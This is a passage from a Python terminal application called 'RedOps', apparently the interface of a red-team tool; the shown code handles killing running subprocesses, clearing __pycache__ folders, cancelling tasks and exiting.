        output.write(alert(str(e)))

     finally:
        if proc and proc in self.running_processes:
            self.running_processes.remove(proc)

    def _force_kill(self, proc):
     try:
        pgid = os.getpgid(proc.pid)
        os.killpg(pgid, signal.SIGTERM)
     except Exception:
        pass


     try:
        os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
     except Exception:
        pass

    def clear_pycache(self, base_path="."):
        removed = 0
        for root, dirs, files in os.walk(base_path):
            for d in dirs:
                if d == "__pycache__":
                    full_path = os.path.join(root, d)
                    try:
                        shutil.rmtree(full_path)
                        removed += 1
                    except Exception:
                        pass
        return removed

    def action_quit_framework(self):
        output = self.query_one("#output", OutputPanel)

        output.write(status("Emergency shutdown initiated..."))

        self.action_cancel_task()

        removed = self.clear_pycache(".")

        output.write(success(f"Cleared {removed} __pycache__ directories"))
        output.write(intel("RedOps terminated safely"))

        self.exit()

    def action_cancel_task(self):
     output = self.query_one("#output", OutputPanel)

     if not self.running_processes:
        output.write(status("No active operation"))
        return

     output.write(alert("Aborting all active operations..."))

     for proc in self.running_processes.copy():
        try:
            pgid = os.getpgid(proc.pid)
            os.killpg(pgid, signal.SIGTERM)
        except Exception:
            pass

     for proc in self.running_processes.copy():
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
        except Exception:
            pass

     self.running_processes.clear()
     output.write(alert("All active operations terminated"))


    def action_clear_output(self):
        output = self.query_one("#output", OutputPanel)
        output.clear()
        output.write(redops_banner())

if __name__ == "__main__":
    RedOps().run()
